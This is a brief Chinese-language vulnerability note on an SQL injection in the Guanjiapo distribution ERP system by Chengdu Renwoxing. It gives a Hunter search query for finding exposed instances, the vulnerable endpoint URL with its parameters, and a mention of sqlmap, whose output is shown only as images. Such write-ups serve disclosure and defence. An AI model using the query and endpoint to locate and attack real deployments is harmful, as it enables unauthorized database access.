# 任我行管家婆分销ERP系统存在sql注入漏洞

# 一、漏洞简介
成都任我行软件股份有限公司管家婆分销ERP系统存在sql注入漏洞

# 二、影响版本
+ 管家婆分销ERP系统

# 三、资产测绘
+ hunter`app.name="任我行管家婆分销 ERP"`
+ 特征

![1699200115160-f74d7aa1-ec34-4806-8151-2bf4ef69fa85.png](./img/j1jES1lDMCQvT9nF/1699200115160-f74d7aa1-ec34-4806-8151-2bf4ef69fa85-743940.png)

# 四、漏洞复现
访问以下路径报错

```plain
/common/viewaccountBase.asp?TimeCheckPoint=80616.91&billnumberid=-1&billtype=
```

![1699200602090-f8c2751d-1e3a-43c5-bdc5-138975e733ba.png](./img/j1jES1lDMCQvT9nF/1699200602090-f8c2751d-1e3a-43c5-bdc5-138975e733ba-525092.png)

sqlmap

![1699200576963-197e2080-8057-4fc4-8f58-6ffa8dc49a28.png](./img/j1jES1lDMCQvT9nF/1699200576963-197e2080-8057-4fc4-8f58-6ffa8dc49a28-122769.png)



> 更新: 2024-02-29 23:55:50  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sazxvh1vu8fxg8rn>